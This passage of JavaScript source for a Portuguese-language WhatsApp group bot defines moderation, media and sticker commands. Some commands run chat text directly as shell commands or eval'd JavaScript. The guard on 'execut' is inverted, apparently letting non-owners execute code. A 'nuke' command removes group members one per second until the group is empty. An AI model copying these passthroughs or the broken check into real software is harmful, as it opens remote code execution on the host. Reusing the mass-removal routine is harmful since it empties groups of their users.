fs.writeFileSync('./datab/usuarios/banned.json', JSON.stringify(ban))
susp = `‚ùé@${mentioned[0].split('@')[0]} foi desbanido e poder√° novamente usar os comandos do bot‚ùé`
mentions(`${susp}`, mentioned, true)   
break

case 'blocklist':
jrc = 'ESTA √â A LISTA DE N√öMEROS BLOQUEADOS :\n'
for (let benn of ban) {
jrc += `~> @${benn.split('@')[0]}\n`
}
jrc += `Total : ${ban.length}`
reply(jrc.trim())
break

case 'acess':
if (!SoDono && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
teks = body.slice(7)
exec(teks, (err, stdout) => {
if (err) return conn.sendMessage(from, {text: `root@Gestorbot-BOT:~ ${err}`}, {quoted: info})
if (stdout) {
conn.sendMessage(from, {text: stdout})
}
})
break

case 'bangp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (isBanchat) return reply(`Este grupo ja est√° banido`)
bancht.push(from)
fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo banido com sucesso`)
break

case 'unbangp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
let cur = bancht.indexOf(from)
bancht.splice(cur, 1)
fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo desbanido...`)
break

case 'limitec_global':
case 'limitec':
if(!SoDono && !isnit && !ischyt) return reply(enviar.msg.donosmt)
if (args.length < 1) return
if(budy.includes("limitec")) {
lmt = args[0]
limitecaracteres_ = {
limite: lmt
}
if(!fs.existsSync(`./func/limitecaracteres/limite-c_${from}.json`)) {
fs.writeFileSync(`./func/limitecaracteres/limite-c_${from}.json`, JSON.stringify(limitecaracteres_, null, 2))
reply(`${limitefl} foi adicionado como limite de caracteres..`)
} else {
fs.unlinkSync(`./func/limitecaracteres/limite-c_${from}.json`)
fs.writeFileSync(`./func/limitecaracteres/limite-c_${from}.json`, JSON.stringify(limitecaracteres_, null, 2))
reply(`foi alterado o limite de caracteres para : ${limitefl}`)
}
} else {
limitefl = args.join(" ")
limitefll.limitefl = limitefl
fs.writeFileSync('./datab/usuarios/flood.json', JSON.stringify(limitefll, null, '\t'))
reply(`${limitefl} foi adicionado como limite de caracteres!!`)
}
break

case 'execut':
if(!SoDono  && !isnit && !issupre && !ischyt && info.key.fromMe) return
try{
return eval(`(async() => { ${args.join(' ')}})()`)
} catch (e) {
reply(`${e}`)
}
break

case 'exec':
if(!SoDono  && !isnit && !issupre && !ischyt) return
try{
paramsQuoted = info.message.extendedTextMessage.contextInfo.quotedMessage.conversation || info.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;	
return eval(`${paramsQuoted}`)
console.log(`[EXEC]~> ${paramsQuoted}`)
}catch(e){
reply(e)
}
break

case 'speed':
case 'ping':
r = (Date.now() / 1000) - info.messageTimestamp
			uptime = process.uptime()
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
bla = `
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Velocidade Do Bot + Informa√ß√µes 
‚îÇ 
‚îÇ Velocidade : ${String(r.toFixed(3))}
‚îÇ 
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Tempo Ativo : 
‚îÇ [ ${kyun(uptime)} ] 
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚îÇ 
‚îÇ Data : ${date} 
‚îÇ 
‚îÇ Grupo : ${groupName} 
‚îÇ 
‚îÇ Solicitou Comando : ${pushname}
‚îÇ 
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ„Äî ${hora1} „Äï
`

await conn.sendMessage(from, {text: bla}, {quoted: selo})
break

case 'tagme':
members_id = []  
const tagme = `@${sender.split("@")[0]} ‚úîÔ∏è`
members_id.push(sender.split("@s.whatsapp.net"))
await mentions(tagme, members_id, true)
break


//==========(BAIXAR/PESQUISAS)==========\\


case 'gerarlink':  
case 'imgpralink':    
try {
if (isQuotedImage) {
reply(enviar.espere)
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
reply(res)
} else {
reply(`Mande uma imagem com a legenda ${prefix + command}`)
}
} catch {
reply('Ocorreu algum Error, desculpe üòî')
}
break

case 'videourl':
case 'videopralink':
try {
if ((isQuotedVideo) && args.length == 0) {
reply(enviar.espere)
boij = isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : info
owgi = await getFileBuffer(boij, 'video')
res = await upload(owgi)
reply(res)
} else {
reply(`Mande v√≠deo com a legenda ${prefix + command}`)
}
} catch {
reply('Ocorreu algum Error, desculpe üòî/ O limite do tamanho de v√≠deo que gero o link, √© 30 segundos.')
}
break


case 'join': case 'entrar':
if (!SoDono) return reply('Somente propriet√°rio!')
string = args.join(' ')
if (!string) return reply('Insira um link de convite ao lado do comando.')
if (string.includes('chat.whatsapp.com/') || reply('Ops, verifique o link que voc√™ inseriu.') ) {
link = string.split('app.com/')[1]
try {
await conn.groupAcceptInvite(`${link}`)
} catch(erro) {
if (String(erro).includes('resource-limit') ) {
reply('O grupo j√° est√° com o alcance de 257 membros.')
}
if (String(erro).includes('not-authorized') ) {
reply('N√£o foi poss√≠vel entrar no grupo.\nMotivo: Banimento.')
}
}
}
break


//============(CASE-BEM-VINDO/E ETC..)=========\\

case 'bemvindo':
case 'welcome':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isWelkom) return reply('Ja esta ativo')
welkom.push(from)
fs.writeFileSync('./datab/grupos/welkom.json', JSON.stringify(welkom))
reply('üåÄ Ativou com sucesso o recurso de bem vindo neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isWelkom) return reply('Ja esta Desativado')
pesquisar = from
processo = welkom.indexOf(pesquisar)
while(processo >= 0){
welkom.splice(processo, 1)
processo = welkom.indexOf(pesquisar)
}
fs.writeFileSync('./datab/grupos/welkom.json', JSON.stringify(welkom))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de bemvindo neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

//=====================================\\



//=================(ANTS)=================\\

case 'antictt':
case 'anticontato':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiCtt) return reply('Ja esta ativo')
antictt.push(from)
fs.writeFileSync('./datab/ants/antictt.json', JSON.stringify(antictt))
reply('üåÄ Ativou com sucesso o recurso de anticontato neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isAntiCtt) return reply('Ja esta Desativado')
pesquisar = from
processo = antictt.indexOf(pesquisar)
while(processo >= 0){
antictt.splice(processo, 1)
processo = antictt.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antictt.json', JSON.stringify(antictt))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de anticontato neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'anticatalogo':
case 'anticatalg':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAnticatalogo) return reply('Ja esta ativo')
anticatalogo.push(from)
fs.writeFileSync('./datab/ants/anticatalogo.json', JSON.stringify(anticatalogo))
reply('üåÄ Ativou com sucesso o recurso de anticatalogo neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isAnticatalogo) return reply('Ja esta Desativado')
pesquisar = from
processo = anticatalogo.indexOf(pesquisar)
while(processo >= 0){
anticatalogo.splice(processo, 1)
processo = anticatalogo.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/anticatalogo.json', JSON.stringify(anticatalogo))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de anticatalogo neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'botoff':
case 'boton':
if (!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply("S√≥ dono pode executar esta a√ß√£o...")
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (botoff.includes(from)) return reply('Ja esta ativo')
botoff.push(from)
fs.writeFileSync('./datab/grupos/botoff.json', JSON.stringify(botoff))
reply('Desativando fun√ß√µes e parando a execu√ß√£o de comandos por membros com sucesso...')
} else if (Number(args[0]) === 0) {
if (!botoff.includes(from)) return reply('Ja esta Desativado')
pesquisar = from
processo = botoff.indexOf(pesquisar)
while(processo >= 0){
botoff.splice(processo, 1)
processo = botoff.indexOf(pesquisar)
}
fs.writeFileSync('./datab/grupos/botoff.json', JSON.stringify(botoff))
reply(`Ativando todos os funcionamentos do bot novamente...`)
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antifake':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntifake) return reply('Ja esta ativo')
antifake.push(from)
fs.writeFileSync('./datab/ants/antifake.json', JSON.stringify(antifake))
reply('üåÄ Ativou com sucesso o recurso de antifake neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isAntifake) return reply('Ja esta Desativado')
pesquisar = from
processo = antifake.indexOf(pesquisar)
while(processo >= 0){
antifake.splice(processo, 1)
processo = antifake.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antifake.json', JSON.stringify(antifake))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de antifake neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiloc':
if (!isGroup) return reply(` SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return reply(`PRECISA SER ADMIN`)
if (!isBotGroupAdmins) return reply(` O BOT PRECISA SER ADMIN`)
try {														 
if (args.length < 1) return reply('1 pra ativar, 0 pra desligar')
if (Number(args[0]) === 1) {
if(Antiloc) return reply('J√° est√° Ativo.')
antiloc.push(from)
fs.writeFileSync('./datab/ants/antiloc.json', JSON.stringify(antiloc))
reply('Ativou com sucesso o recurso de anti loc neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if(!Antiloc) return reply('J√° est√° Desativado.')
antiloc.splice(from, 1)
fs.writeFileSync('./datab/ants/antiloc.json', JSON.stringify(antiloc))
reply('Desativou com sucesso o recurso de anti loc neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Deu erro, tente novamente :/')
}
break

case 'antidocumento':
case 'antidoc':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (Antidoc) return reply('Ja esta ativo')
antidoc.push(from)
fs.writeFileSync('./datab/ants/antidoc.json', JSON.stringify(antidoc))
reply('üåÄ Ativou com sucesso o recurso de anti documento neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!Antidoc) return reply('Ja esta Desativado')
pesquisar = from
processo = antidoc.indexOf(pesquisar)
while(processo >= 0){
antidoc.splice(processo, 1)
processo = antidoc.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antidoc.json', JSON.stringify(antidoc))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de anti documento neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiimg':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiImg) return reply('J√° Esta ativo')
antiimg.push(from)
fs.writeFileSync('./datab/ants/antiimg.json', JSON.stringify(antiimg))
reply('Ativou com sucesso o recurso de anti imagem neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiImg) return reply('Ja esta Desativado.')
antiimg.splice(from, 1)
fs.writeFileSync('./datab/ants/antiimg.json', JSON.stringify(antiimg))
reply('Desativou com sucesso o recurso de anti imagem neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antisticker':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiSticker) return reply('J√° Esta ativo')
antisticker.push(from)
fs.writeFileSync('./datab/ants/antisticker.json', JSON.stringify(antisticker))
reply('Ativou com sucesso o recurso de anti sticker neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiSticker) return reply('Ja esta Desativado.')
antisticker.splice(from, 1)
fs.writeFileSync('./datab/ants/antisticker.json', JSON.stringify(antisticker))
reply('Desativou com sucesso o recurso de anti sticker neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antinotas':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiNotas) return reply('J√° Esta ativo')
antinotas.push(from)
fs.writeFileSync('./datab/ants/antinotas.json', JSON.stringify(antinotas))
reply('Ativou com sucesso o recurso de anti notas neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiNotas) return reply('Ja esta Desativado.')
antinotas.splice(from, 1)
fs.writeFileSync('./datab/ants/antinotas.json', JSON.stringify(antinotas))
reply('Desativou com sucesso o recurso de anti notas neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antivideo':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiVid) return reply('Ja esta ativo')
antivid.push(from)
fs.writeFileSync('./datab/ants/antivideo.json', JSON.stringify(antivid))
reply('Ativou com sucesso o recurso de anti video neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiVid) return reply('Ja esta Desativado')
antivid.splice(from, 1)
fs.writeFileSync('./datab/ants/antivideo.json', JSON.stringify(antivid))
reply('Desativou com sucesso o recurso de anti video neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiaudio':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiAudio) return reply('Ja esta ativo')
antiaudio.push(from)
fs.writeFileSync('./datab/ants/antiaudio.json', JSON.stringify(antiaudio))
reply('Ativou com sucesso o recurso de anti audio neste grupo‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAntiAudio) return reply('Ja esta Desativado')  
antiaudio.splice(from, 1)
fs.writeFileSync('./datab/ants/antiaudio.json', JSON.stringify(antiaudio))
reply('Desativou com sucesso o recurso de anti audio neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'limitecaracteres':
case 'limiteflood':  
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar. info.Badmin)
if (args.length < 1) return reply(`Digite ${prefix + command} 1 para ativar`)
if (Number(args[0]) === 1) {
if (isAntiFlood) return reply(`üåÄ O recurso limite de caracteres at√© ${limitefl} j√° est√° ativo no grupo üåÄ`)
antiflood.push(from)
fs.writeFileSync('./datab/usuarios/antiflood.json', JSON.stringify(antiflood))
reply(`‚úîÔ∏è O recurso limite de caracteres ${limitefl} foi ativado nesse grupoüìù`)
} else if (Number(args[0]) === 0) {
 if (!isAntiFlood) return reply('‚úîÔ∏è O recurso limite de caracteres n√£o est√° ativado no grupo üìù')
let position = false
Object.keys(antiflood).forEach((i) => {
if (antiflood[i] === from) {
position = i
}
})
if (position !== false) {
antiflood.splice(position, 1)
fs.writeFileSync('./datab/usuarios/antiflood.json', JSON.stringify(antiflood))
}
reply('O recurso limite de caracteres foi desativado nesse grupo ‚úîÔ∏è')
} else {
reply(`Digite ${prefix + command} 1 para ativar, 0 para desativar o recurso`)
}
break

case 'reiniciar':
if(!SoDono) return
rp = (Date.now() / 1000) - info.messageTimestamp
blar = process.uptime()
startAle()
reply(`Reiniciei em ${String(rp.toFixed(3))}m\n\nTempo Ativo : ${kyun(blar)}`)
break

case 'antiporno':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiPorn) return reply('Ja esta ativo')
antiporn.push(from)
fs.writeFileSync('./datab/ants/antiporn.json', JSON.stringify(antiporn))
reply('üåÄ Ativou com sucesso o recurso de antiporn neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isAntiPorn) return reply('Ja esta Desativado')
pesquisar = from
processo = antiporn.indexOf(pesquisar)
while(processo >= 0){
antiporn.splice(processo, 1)
processo = antiporn.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antiporn.json', JSON.stringify(antiporn))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de antiporn neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antipalavr√£o':
case 'antipalavrao':  
case 'antipalavra':    
if (!isGroup) return reply(`[‚ùó] SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return reply(`[‚ùó] O PRECISA SER ADMIN`)
if (!isBotGroupAdmins) return reply(`[‚ùó] O BOT PRECISA SER ADMIN`)
if (args.length < 1) return reply(`[‚ùó] 1 / 0, Exemplo ${prefix + command} 1`)
if (Number(args[0]) === 1) {
if (isPalavrao) return reply('Ja esta ativo.')
palavrao.push(from)
fs.writeFileSync('./datab/grupos/palavrao.json', JSON.stringify(palavrao))
reply('üåÄ Ativou com sucesso o recurso de Anti Palavras hardcore neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isPalavrao) return reply('Ja esta Desativado')
pesquisar = from
processo = palavrao.indexOf(pesquisar)
while(processo >= 0){
palavrao.splice(processo, 1)
processo = palavrao.indexOf(pesquisar)
}
fs.writeFileSync('./datab/grupos/palavrao.json', JSON.stringify(palavrao))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de Anti Palavra harcore neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antilinkhard':
case 'antilink':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiLinkHard) return reply('Ja esta ativo')
antilinkhard.push(from)
fs.writeFileSync('./datab/ants/antilinkhard.json', JSON.stringify(antilinkhard))
reply('üåÄ Ativou com sucesso o recurso de antilink hardcore neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isAntiLinkHard) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkhard.indexOf(pesquisar)
while(processo >= 0){
antilinkhard.splice(processo, 1)
processo = antilinkhard.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antilinkhard.json', JSON.stringify(antilinkhard))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de antilink harcore neste grupo‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break


case 'antilinkgp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntilinkgp) return reply('Ja esta ativo')
antilinkgp.push(from)
fs.writeFileSync('./datab/ants/antilinkgp.json', JSON.stringify(antilinkgp))
reply('üåÄ Ativou com sucesso o recurso de antilinkgp üìù')
} else if (Number(args[0]) === 0) {
if (!isAntilinkgp) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkgp.indexOf(pesquisar)
while(processo >= 0){
antilinkgp.splice(processo, 1)
processo = antilinkgp.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antilinkgp.json', JSON.stringify(antilinkgp))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de antilink de grupo ‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'bemvindo2':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply(`Digite da forma correta:\nComando: ${prefix + command} 1 para ativar `)
if (Number(args[0]) === 1) {
reply(`Devo Lembrar que voc√™ deve determinar a legenda desse grupo, ap√≥s ativar essa fun√ß√£o, a legenda funciona por grupo, se deseja saber mais informa√ß√µes sobre, digite ${prefix}infobemvindo`)  
if (isWelkom2) return reply('‚ùéO recurso j√° est√° ativado no grupo‚ùé')
welkom2.push(from)
fs.writeFileSync('./datab/usuarios/vacilo.json', JSON.stringify(welkom2))
reply('‚úÖO recurso foi ativado‚úÖ')
} else if (Number(args[0]) === 0) {
if (!isWelkom2) return reply('‚ùéO recurso n√£o est√° ativado no grupo‚ùé')
let position = false
Object.keys(welkom2).forEach((i) => {
if (welkom2[i] === from) {
position = i
}
})
if (position !== false) {
welkom2.splice(position, 1)
fs.writeFileSync('./datab/usuarios/vacilo.json', JSON.stringify(welkom2))
}
reply('‚ùåO recurso foi desativado‚ùå')
} else {
reply(`Digite da forma correta:\nComando: ${prefix + command} 1, para ativar e 0 para desativar`)
}
break

case 'rename':
case 'roubar':  
if (!isQuotedSticker) return reply('Marque uma figurinha...')
encmediats = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
var kls = q
var pack = kls.split("/")[0];
var author2 = kls.split("/")[1];
if (!q) return reply('*E o autor e o nome do pacote?*')
if (!pack) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/bla*`)
if (!author2) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/dms*`)
reply(enviar.espere)
bas64 = `data:image/jpeg;base64,${encmediats.toString('base64')}`
var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
var sti = new Buffer.from(mantap, 'base64');
conn.sendMessage(from, {sticker: sti, contextInfo: { externalAdReply:{title: `${pack}|${author2}`,body:"", previewType:"PHOTO",thumbnail: sti}}}, {quoted: info})
.catch((err) => {
reply(`‚ùé Error, tenta mais tarde`); 
})
break

case 'st':
case 'st':
case 'sticker':
case 's':
try {
if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
reply(enviar.espere)
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
conn.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})
} else if ((isMedia && info.message.videoMessage.seconds < 11 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 10) && args.length == 0) {
const encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('bot', 'ale')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na convers√£o de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
conn.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})
} else {
reply(`Voc√™ precisa enviar ou marcar uma imagem ou v√≠deo com no m√°ximo 10 segundos`)
}
} catch(e) {
console.log(e)
reply('Ocorreu algum Error, desculpe üòî')
}
break

case 'toimg':
if (!isQuotedSticker) return reply('‚ùå adesivo de resposta um ‚ùå')
reply(enviar.espere)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
conn.sendMessage(from, {image: buff}, {quoted: info}).catch(e => {
console.log(e);
reply('ERROR!!')
})
break


case 'banner':
anu = await getBuffer('https://lordgcs-api.herokuapp.com/api/zettaiRyouiki?apikey=CompreSeuAcesso')
conn.sendMessage(from, {image: anu, mimetype: 'image/jpeg'}, {quoted: info, quoted: selo})
break


case 'nuke': case 'arquivargp':
if(!SoDono && !isnit) return reply("S√≥ dono pode utilizar este comando...")
if(info.key.fromMe) return 
function banirtodos() {
var r_banirtodos = Math.floor(Math.random() * groupMembers.length + 0)
nmrbot = botNumber.split("@")[0]
var resp = `${groupMembers[r_banirtodos].id.split("@")[0]}`
if(resp === setting.numerodono || resp === nmrbot) {
return
} else {
conn.groupParticipantsUpdate(from, [resp + "@s.whatsapp.net"], 'remove')
}
if(groupMembers.length <= 2) {
process.exit()
}
}
setInterval(banirtodos, 1000)
break


//===(ZOUEIRAS/BRINCADEIRAS/HUMOR)===\\

case 'modonsfw':
case 'nsfw':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isNsfw) return reply('O modo nsfw j√° est√° ativo')
nsfw.push(from)
fs.writeFileSync('./datab/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`‚úìAtivado com sucesso o modo nsfw +18 no grupo\`\`\` *${groupMetadata.subject}*`)
} else if (Number(args[0]) === 0) {
if (!isNsfw) return reply('O modo nsfw j√° est√° Desativado')  
nsfw.splice(from, 1)
fs.writeFileSync('./datab/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`‚úìModo Nsfw +18 desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
} else {
reply('1 para ativar, 0 para desligar')
}
break 

//========================================\\


//==(AUDIOS/DE-MUSICA/ZOUEIRA/ETC..)===\\

case 'bot':
const soundft = fs.readFileSync('audios/qviado.mp3')
await conn.sendMessage(from, {audio: soundft, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
break

case 'infobot':
const cmdoo = fs.readFileSync('audios/infobot.mp3')
await conn.sendMessage(from, {audio: cmdoo, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
break 


default:

//===  CONFIGS==\\

if(isBotGroupAdmins && isAntiCtt && type === 'contactMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text: 'Contato detectado, voc√™ √© adm, ent√£o n√£o irei ti remover'}, {quoted: info})
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
conn.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(3000);
